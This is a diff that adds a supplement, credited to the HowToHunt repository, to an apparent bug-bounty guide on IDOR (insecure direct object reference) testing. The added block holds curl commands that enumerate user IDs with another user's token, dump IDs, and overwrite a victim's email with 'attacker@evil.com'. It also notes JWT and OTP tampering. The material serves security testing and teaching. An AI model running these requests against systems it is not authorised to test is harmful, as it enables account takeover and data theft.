@@ -144,6 +144,29 @@ attack_script response_diff "https://TARGET/api/users/VICTIM_ID" \
 - `attack_script response_diff` — response comparison
 - `attack_script jwt_tamper` — token manipulation for IDOR
 
+## HowToHunt Advanced Supplement
+
+> **Source:** [KathanP19/HowToHunt — IDOR](https://github.com/KathanP19/HowToHunt/tree/master/IDOR) (326 lines). Licensed GPL-3.0.
+
+**Advanced IDOR vectors from HowToHunt:**
+
+```bash
+# Predictable ID (incremental, timestamp-based)
+curl -H "Authorization: Bearer $TOKEN_A" https://target.com/api/user/1001
+curl -H "Authorization: Bearer $TOKEN_A" https://target.com/api/user/1002 # 200 = IDOR
+
+# UUID but enumerable via API leak (check /api/users returns all IDs)
+curl https://target.com/api/users | jq '.[].id'
+
+# ID in JWT claim — tamper kid/payload to change user
+# IDOR via POST body (often missed)
+curl -X POST https://target.com/api/update -d '{"user_id":1001,"email":"attacker@evil.com"}'
+
+# IDOR via referral/OTP (HowToHunt: use victim's OTP for attacker)
+```
+
+HowToHunt emphasizes testing both horizontal (same role) and vertical (role escalation) — test IDs across roles (user → admin `id=1`).
+
 ## References
 
 - [OWASP: IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
